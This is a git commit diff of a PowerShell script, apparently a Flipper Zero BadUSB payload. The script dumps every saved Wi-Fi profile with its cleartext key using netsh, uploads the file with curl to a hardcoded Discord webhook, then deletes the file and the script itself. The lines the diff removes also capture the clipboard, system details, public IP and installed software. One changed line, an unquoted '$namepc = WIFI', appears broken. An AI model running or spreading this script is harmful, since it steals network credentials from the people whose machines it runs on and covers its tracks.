3ed1ecbe94586dfc2fa4f50e1289cff12cc33191
Yetykotlety <146130248+Yetykotlety@users.noreply.github.com>
2024-03-23 21:06:10 +0100

    e.ps1

--- e.ps1
+++ e.ps1
@@ -1,47 +1,20 @@
 #CHANGE URL TO YOUR URL
   $url="https://discord.com/api/webhooks/1133794641678958712/PXc6JyofnzdgkXSYJwOwhPst7TGkGuPV0Eq3jhcj094hPuDo8XgaOUPu0rjNuMWdNW2v" ;
 #Get PC Name+Date+Time
-  $namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S"
-
-# Get PC ClipBoard
-  echo "" > "$env:temp\stats-$namepc.txt";
-  echo "####PC ClipBoard under this line:" >> "$env:temp\stats-$namepc.txt";
-  echo "####################################" >> "$env:temp\stats-$namepc.txt";
-  Get-Clipboard >> "$env:temp\stats-$namepc.txt";
-  echo "####################################" >> "$env:temp\stats-$namepc.txt";
-  echo "####End ClipBoard" >> "$env:temp\stats-$namepc.txt";
+  $namepc = WIFI
 
 # Get WifiPassword
-echo "" > "$env:temp\WIFI-$namepc.txt";
-(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | out-file "$env:temp\WIFI-$namepc.txt";
-
-# Get PC information
-  dir env: >> "$env:temp\stats-$namepc.txt";
-# Get public IP
-  $pubip = (Invoke-WebRequest -UseBasicParsing -uri "http://ifconfig.me/").Content
-  echo "PUBLIC IP: $pubip" >> "$env:temp\stats-$namepc.txt";
-# Get Local IP
-  ipconfig /all >> "$env:temp\stats-$namepc.txt";
-# List all installed Software
-  echo "Installed Software:" >> "$env:temp\stats-$namepc.txt";
-  Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";
-  Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";
+echo "" > "$env:temp\EXFILTRED-$namepc.txt";
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | out-file "$env:temp\EXFILTRED-$namepc.txt";
 
 #UPLOAD
 cd $env:temp
-# Send Name Computer to discord
-  $Body=@{ content = "**Stats from Flipper-Zero on user:** $env:UserName, on pc: $env:computername"};
-  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
-# Upload Stat
-  curl.exe -F "file1=@stats-$namepc.txt" $url;
 # Upload wifi password
-  curl.exe -F "file2=@WIFI-$namepc.txt" $url;
+  curl.exe -F "file2=@EXFILTRED-$namepc.txt" $url;
 
 #Delete all file
-# Delete stat
-  Remove-Item "stats-$namepc.txt" -Force -Recurse;
 # Delete wifi password
-  Remove-Item "WIFI-$namepc.txt" -Force -Recurse;
+  Remove-Item "EXFILTRED-$namepc.txt" -Force -Recurse;
 # Delete this script
   Remove-Item  $env:temp\e.ps1 -Force -Recurse;
 
